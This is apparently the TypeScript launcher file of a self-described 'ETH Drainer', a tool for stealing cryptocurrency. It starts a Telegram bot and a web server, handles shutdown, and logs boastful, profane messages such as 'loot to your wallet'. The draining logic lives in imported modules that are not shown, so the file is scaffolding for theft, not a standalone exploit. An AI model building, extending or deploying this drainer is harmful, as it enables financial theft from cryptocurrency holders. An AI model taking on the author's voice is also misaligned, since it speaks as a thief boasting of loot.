import TelegramBot from 'node-telegram-bot-api';
import { MS_Telegram_Token, setupTelegramBot } from './utils/Utilite';  // .ts for source
import app from './index';  // Assuming index.ts

const bot = new TelegramBot(MS_Telegram_Token, { polling: true });
setupTelegramBot(bot);

bot.on('polling_error', (error) => {
  console.error('Polling fucked:', error.code || error.message);  // Beefier log for Render
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Drainer web on port ${PORT}`);
});

process.on('SIGINT', () => {
  console.log('Shutting down drainer...');
  bot.stopPolling();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught shit:', err);
  bot.stopPolling();
  process.exit(1);
});  // Added: Catches any runtime puke

console.log('ETH Drainer bot live - loot to your wallet, motherfucker.');
